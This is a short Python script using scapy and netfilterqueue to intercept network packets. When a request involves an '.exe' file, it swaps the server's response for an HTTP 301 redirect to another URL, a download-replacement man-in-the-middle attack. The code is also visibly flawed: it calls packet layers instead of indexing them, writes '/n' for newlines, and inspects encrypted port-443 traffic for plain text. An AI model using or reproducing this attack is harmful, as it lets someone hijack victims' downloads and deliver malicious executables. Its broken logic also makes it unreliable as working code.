import scapy.all as scapy

import netfilterqueue


clientlist=[]

def processed_packet(packet):


    scapy_packet=scapy.IP(packet.get_payload())

    

    if scapy_packet.haslayer(scapy.Raw):

        if scapy_packet[scapy.TCP].sport==443:

            if ".exe" in scapy_packet(scapy.Raw).load:

                clientlist.append(scapy_packet[scapy.TCP].ack)


        elif scapy_packet[scapy.TCP].dport==443:


            if scapy_packet[scapy.TCP].seq in clientlist:


                clientlist.remove(scapy_packet[scapy.TCP].seq)

                scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently /nLocation: http://www.example.org/index.asp/n/n"

                del scapy_packet(scapy.IP).len
                del scapy_packet(scapy.IP).chksum
                del scapy_packet(scapy.TCP).chksum

                packet.set_payload(str(scapy_packet))

            

            

    


    packet.accept()



queue=netfilterqueue.NetfilterQueue()

queue.bind(0,processed_packet)

queue.run()
